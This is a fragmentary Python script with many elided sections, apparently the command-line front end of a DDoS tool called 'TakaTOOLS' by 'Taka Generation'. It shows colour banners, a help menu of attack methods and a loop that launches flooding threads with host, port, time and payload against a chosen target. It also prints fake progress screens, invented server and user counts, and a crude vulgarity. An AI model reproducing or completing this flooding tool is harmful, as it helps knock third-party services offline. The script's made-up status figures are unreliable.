...
raw = """
\033[0;36m                              TOOLS BY Taka Generation
\033[0;36m            ╔══════════════════════════╦════════════════════════════╗
...
\033[0;34mTAKAA\033[36mTOOLS SUCCES SEND TO IP\033[0;34m GIMANA LANJUT?
\033[0;34mKETIK HELP UNTUK LANJUT!!!

"""

helpservice =  """
\033[0;36m		      ================HELP COMMAND====================
\033[0;36m                           ==================❤CANT NEED HELP? SEND COMMAND: help❤====================         
\033[0;36m                           
\033[0;36m                           
\033[0;36m
\033[0;36m             ╦═══════════════════════════════════════════════╦
...
\033[0;36m	       ║ \033[0;34mBYPASS      ||  ||			   \033[0;36m║
\033[0;36m             ╩═══════════════════════════════════════════════╩
...
\033[0;36m                              
\033[0;36m =============Taka CREATED THIS DDOS======================"""
...
def main():
	...
	while True:
		...
		sys.stdout.write("\x1b]2;[-] TakaTOOLS | Api Connected [5] | Backup Server [1] | Online User [1000] | Admin: [Taka] | POWER : {}% [UNSTABLE]\x07".format (powerran))
		...
		if sinput == "cls":
			...
			try:
				if running >= 20000:
					...
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[91m[10%] Taka Generation Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[91m[25%] Taka Generation Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[91m[50%] Taka Generation Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[75%] Taka Generation Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[100%] Taka Generation Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[91m[PROSES] Taka Generation Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[DUAR MEMEK] Taka Generation Attack.")
					time.sleep(1)
					os.system('cls')
			...
			try:
				if running >= 20000:
					...
					main()
						...
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\033[91m[-] Taka Generation Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[\] Taka Generation Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[97m[|] Taka Generation Attack...")
						time.sleep(1)
			...
			try:
				if running >= 20000:
					...
					time.sleep(1)
					os.system('cls')
					print("\033[97m[25%] Taka Generation Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[50%] Taka Generation Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[75%] Taka Generation Attack....")
					time.sleep(1)
